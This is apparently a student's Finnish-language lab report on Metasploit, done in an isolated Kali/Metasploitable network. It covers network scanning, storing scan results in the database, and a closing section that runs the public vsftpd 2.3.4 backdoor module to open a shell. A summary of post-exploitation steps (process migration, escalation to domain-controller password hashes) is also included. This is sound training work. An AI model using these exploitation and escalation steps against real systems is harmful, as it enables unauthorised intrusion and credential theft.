# x) Lue/katso/kuuntele ja tiivistä

## Chapter 1: Approaching a Penetration Test Using Metasploit

### Tunkeutumistestauksen hyödyt metasploitablella

- Erilaisten järjestelmien testaus mahdollista
- Avoin lähdekoodi
- Tiedon kerääminen. Voi tallentaa erillisesti omaan tietokantaan tai tiedostoon.
- Payloadien vaihtaminen ja konfigurointi helppoa
- Ei kaada järjestelmää, jos poistuu hetkellisesti hyökättävästä koneesta.

### Case study – reaching the domain controller

#### Tiedonkeruu
- db_nmap komennolla voi tallentaa skannauksen tietokantaan
- Kun tiedossa on järjestelmän käyttöjärjestelmä skannauksen avulla, voidaan ajaa hyökkäys, jolla voidaan hyökätä käyttöjärjestelmään.

### Threat modeling
- Search - toiminnolla löytää tunnetut haavoittuvuudet
- Moduulin valinnassa tulee aina noudattaa seuraavia kriteerejä:

`**Erinomainen:** Moduuli ei koskaan kaada palvelua.
**Hyvä:** Moduulilla on oletusasetus tai se pystyy automaattisesti tunnistamaan oikean kohteen ja käyttämään oikeita asetuksia versiontarkistuksen jälkeen.
**Kohtalainen:** Moduulilla on oletusasetus, ja haavoittuvuus on melko yleinen.
**Normaali:** Moduuli on yleensä luotettava, mutta riippuu tietystä versiosta.
**Heikko:** Moduulin hyödynnettävyys on alle 50 %, mikä tarkoittaa, että sitä on lähes mahdotonta hyödyntää oletusasetuksissa. `

### Hyväksikäyttö ja pääsynsaanti
- "use <exploit/path/to/module>", lataa hyökkäyksen.
- "show options" näyttää parametrit
- "exploit -j" ajaa hyökkäyksen taustalla.

### Pääsynsaannin jälkeen
- Hyökkäys kannattaa siirtää prosessiin, jota todennäköisemmin ei suljeta, esim. powershellistä explorer.exe.
- Hyökkääjä tekee itsestään adminin, jotta pääsee käsiksi domain controlleriin ja sen kautta Active Directoryyn, josta pääsee käsiksi salasanatiivisteisiin.

# a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, että 1) koneet eivät saa yhteyttä Internetiin 2) Koneet saavat yhteyden toisiinsa.

## 1) Ei yhteyttä internettiin
![image](https://github.com/user-attachments/assets/464ff201-f9a5-4ef7-8a58-23774120af08)
![image](https://github.com/user-attachments/assets/cd7d9a68-3d12-4ce5-b725-e86ca73ad6d4)

## 2) Yhteys toiseen koneeseen
![image](https://github.com/user-attachments/assets/192458c5-b3b6-4089-b77d-d7e18791e7b0)
![image](https://github.com/user-attachments/assets/7006015f-afb5-4705-82d6-8ffe8205cea4)

# b) Ota Metasploit msfconsole käyttöön
![image](https://github.com/user-attachments/assets/7e45ea04-fa0a-47eb-a559-7b2351297afa)

# c) c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable.
### Ensiksi laitoin pyydetyn komennon konsoliin, saimme vastaukseksi, että tietokanta ei ole yhdistetty. Löysin nopealla googlauksella videon avustuksella (https://www.youtube.com/watch?v=nHiUThZxhHY) ratkaisun ongelmaan. Palaamme takaisin kali:iin, jossa käytämme komennon 'msfdb init', joka käynnistää tietokannan metaspoitableen. Varmistan vielä, että postgre-palvelu on käynnissä komennolla 'sudo service postgresql start'.
![image](https://github.com/user-attachments/assets/ba7a8998-1ac0-4709-b036-aefa9ae72671)
### Tarkistin vielä nmap komennon yhteydessä, että myös olemme kohdentamassa oikeaa IP:tä. 
![image](https://github.com/user-attachments/assets/2da4472f-02d5-4909-9d58-6040daa37597)

# d) Porttiskannaa Metasploitable perusteellisesti. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo).
### Ensiksi tallennamme tulokset metasploitin tietokantoihin: "db_nmap -A *IP*"
![image](https://github.com/user-attachments/assets/dbcb4870-1a33-4e49-879c-16bcb4e5be99)
### Saamme tulokset tiedostoihin käyttämällä -oA - flägiä: "nmap -oA h2_ms2 -A *IP*"
![image](https://github.com/user-attachments/assets/7ca8425b-835b-4684-a598-d7b7ea30be3d)

# e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.
### Komennolla "services -h" saamme lisätietoa, miten services komentoa voi käyttää. Esimerkkinä suodatan porttiväliä 1-100, josta näemme haavoittuneet portit tuolla välillä.
![image](https://github.com/user-attachments/assets/86105508-6234-47e4-b2f7-b820a340b130)

# f) Vertaile nmap:n omaa tiedostoon tallennusta ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?
### Kokeilin kahta tapaa grepata tiedostoja: file.nmap sekä file.gnmap. file.gnmap tulostuu heikosti, mutta file.nmap tulostuu luettavammaksi.
![image](https://github.com/user-attachments/assets/57102c88-0870-4570-a9c4-ec689170cdd9)

# g) Murtaudu Metasploitablen vsftpd-palveluun

### Käytän Jacobsin ohjeista kohtaa 3: Gaining access

    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor    # Valitaan haavoittuvuus, tässä tapauksessa "exellent"
    set RHOSTS 192.168.56.109    # Hyökätään metaspoitable koneeseen
    run    # ??? PROFIT
### Pääsimme käsiksi koneeseen, hyökkäys ilmoittaa että löysimme shellin, kirjoitan shell, jonka jälkeen hyökkäys ilmoittaa, että bash on valittavissa, kirjoitamme "bash", jonka jälkeen bash:in komentosyöte avautuu. Pääsemme esimerkiksi kiinni koneen kansiorakenteeseen -> 'ls -la'.

![image](https://github.com/user-attachments/assets/02524e6f-9a0b-4c35-9e4c-ff58ca15aaba)

![image](https://github.com/user-attachments/assets/eaed2158-cafd-4989-9502-3410420c7c67)

![image](https://github.com/user-attachments/assets/8c3feb8f-e68a-4ff6-95d3-a482332a8e9a)


    







